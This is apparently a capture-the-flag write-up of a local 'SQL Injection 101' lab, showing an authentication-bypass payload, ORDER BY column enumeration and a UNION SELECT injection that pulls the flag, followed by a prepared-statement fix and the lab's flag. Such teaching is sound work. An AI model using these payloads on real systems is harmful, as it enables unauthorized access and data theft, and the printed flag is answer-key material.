# Writeup: SQL Injection 101 Lab

**Lab:** SQL Injection 101  
**Difficulty:** Easy  
**Author:** user_0x41  
**Date:** March 1, 2025

---

> ⚠️ **Spoiler Warning** — Stop reading if you haven't attempted the lab yet!

---

## Overview

The SQL Injection 101 lab runs a simple PHP web app with a login form that passes user input directly into a MySQL query without sanitization. Our goal: bypass authentication and extract the flag from the database.

---

## Setup

```bash
git clone https://github.com/dock-and-root-labs/web-sql-injection
cd web-sql-injection
docker compose up -d
```

After about 10 seconds, the app is available at `http://localhost:8080`.

---

## Reconnaissance

First, open the app in the browser. We see a basic login form:

- Username field
- Password field
- Login button

No JavaScript-heavy framework. Likely renders HTML from the backend. Let's probe it.

---

## Testing for SQLi

Try a classic injection in the username field:

```
' OR '1'='1
```

Password: anything

**Result:** Logged in! The page shows the admin dashboard.

### Why it works

The vulnerable query looks something like:

```sql
SELECT * FROM users WHERE username='$username' AND password='$password'
```

With our injection:

```sql
SELECT * FROM users WHERE username='' OR '1'='1' AND password='anything'
```

Since `'1'='1'` is always true, the WHERE clause matches all rows and returns the first user — the admin.

---

## Extracting the Flag

Once on the admin dashboard, there's a "Secret" section. The page briefly shows part of the flag. Let's be more surgical with a UNION injection.

First, determine the column count:

```
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -  <- Error appears here
```

So there are 2 columns. Now extract data:

```
' UNION SELECT 1, flag FROM secrets-- -
```

The page renders:

```
DRL{sqli_is_still_alive_and_kicking}
```

---

## Takeaways

1. **Never concatenate user input into SQL** — Always use prepared statements
2. **Error messages reveal structure** — ORDER BY enumeration + UNION-based extraction
3. **Authentication bypass** — `OR 1=1` is as old as SQL itself, still works on unprotected apps

### Secure Code Example

```php
// Vulnerable
$query = "SELECT * FROM users WHERE username='$username'";

// Secure (Prepared Statement)
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$username]);
```

---

## Flag

```
DRL{sqli_is_still_alive_and_kicking}
```

Happy hacking! 🎉
